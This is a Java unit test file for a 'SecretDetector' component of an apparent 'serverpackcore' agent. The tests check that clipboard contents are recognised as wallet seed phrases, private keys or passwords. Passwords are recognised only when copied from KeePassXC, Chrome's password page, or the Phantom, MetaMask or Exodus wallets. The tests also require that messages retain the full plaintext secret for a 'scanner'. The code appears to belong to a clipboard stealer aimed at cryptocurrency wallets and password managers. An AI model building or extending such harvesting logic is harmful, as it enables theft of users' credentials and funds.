package com.serverpackcore.agent;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertNull;
import static org.junit.jupiter.api.Assertions.assertTrue;

import org.junit.jupiter.api.Test;

class SecretDetectorTest {
	private static final String SEED = "abandon abandon abandon abandon abandon abandon "
		+ "abandon abandon abandon abandon abandon about";
	private static final String SOL = "2AXDGYSE4f2sz7tvMMzyHvUfcoJmxudvdhBcmiUSo6ijwfYmfZYsKRxboQMPh3R4kUhXRVdtSXFXMheka4Rc4P2";

	@Test
	void seedNeedsAValidChecksum() {
		assertEquals("seed-12", SecretDetector.detect(SEED, "notepad.exe", "").kind());
		assertNull(SecretDetector.detect(SEED.replace("about", "abandon"), "notepad.exe", ""));
	}

	@Test
	void extendedAndRawKeys() {
		assertEquals("xprv", SecretDetector.detect("xprv" + "A".repeat(107), "notepad.exe", "").kind());
		assertEquals("evm-key", SecretDetector.detect(
			"d02f2326a08aa339b1d73e4ef2a4384126c17841e5551461e6e27806e829f05d", "notepad.exe", "").kind());
		assertEquals("evm-key", SecretDetector.detect("0x" + "a1".repeat(32), "notepad.exe", "").kind());
		assertEquals("solana-key", SecretDetector.detect(SOL, "notepad.exe", "").kind());
	}

	@Test
	void constantHexFillIsNotAKeyWithoutPrefix() {
		assertNull(SecretDetector.detect("0".repeat(64), "notepad.exe", ""));
		assertEquals("evm-key", SecretDetector.detect("0x" + "0".repeat(64), "notepad.exe", "").kind());
	}

	@Test
	void passwordsOnlyFromCredentialSources() {
		assertEquals("password", SecretDetector.detect("s3cret-pass", "KeePassXC.exe", "").kind());
		assertEquals("password", SecretDetector.detect("abc123", "KeePassXC.exe", "").kind());
		assertNotNull(SecretDetector.detect("s3cret-pass", "chrome.exe", "Passwords - Google Chrome"));
		assertNull(SecretDetector.detect("s3cret-pass", "notepad.exe", "Sin titulo"));
		assertNull(SecretDetector.detect("corta", "KeePassXC.exe", ""));
	}

	@Test
	void passwordsFromWalletWindows() {
		String password = "ep9yRGCprVri$VhMx7^@&6v6Y%C61cVljtufLYqPQhS#$OSKwC!#gqis";
		assertEquals("password", SecretDetector.detect(password, "chrome.exe", "Phantom").kind());
		assertEquals("password", SecretDetector.detect(password, "msedge.exe", "MetaMask").kind());
		assertEquals("password", SecretDetector.detect(password, "exodus.exe", "Exodus Wallet").kind());
		assertNull(SecretDetector.detect(password, "notepad.exe", "Sin titulo"));
	}

	@Test
	void ignoresUrlsMultilineAndOrdinaryText() {
		assertNull(SecretDetector.detect("https://example.com/" + SEED, "KeePassXC.exe", ""));
		assertNull(SecretDetector.detect(SEED + "\n" + SEED, "KeePassXC.exe", ""));
		assertNull(SecretDetector.detect("hola que tal", "notepad.exe", ""));
	}

	@Test
	void remembersAClipboardAlertForTheScanner() {
		assertFalse(SecretDetector.alertedRecently(SEED));
		SecretDetector.alerted(SEED);
		assertTrue(SecretDetector.alertedRecently("  " + SEED + " "));
		assertFalse(SecretDetector.alertedRecently(SEED.replace("about", "abandon")));
	}

	@Test
	void messageKeepsTheValue() {
		var secret = SecretDetector.detect(SEED, "chrome.exe", "Passwords");
		assertNotNull(secret);
		assertEquals("clipboard seed (12 palabras): " + SEED, SecretDetector.message(secret, "chrome.exe", "Passwords"));

		String password = "ep9yRGCprVri$VhMx7^@&6v6Y%C61cVljtufLYqPQhS#$OSKwC!#gqis";
		var pass = SecretDetector.detect(password, "chrome.exe", "Phantom");
		assertNotNull(pass);
		assertEquals("clipboard contraseña (chrome.exe | Phantom): " + password,
			SecretDetector.message(pass, "chrome.exe", "Phantom"));
	}
}
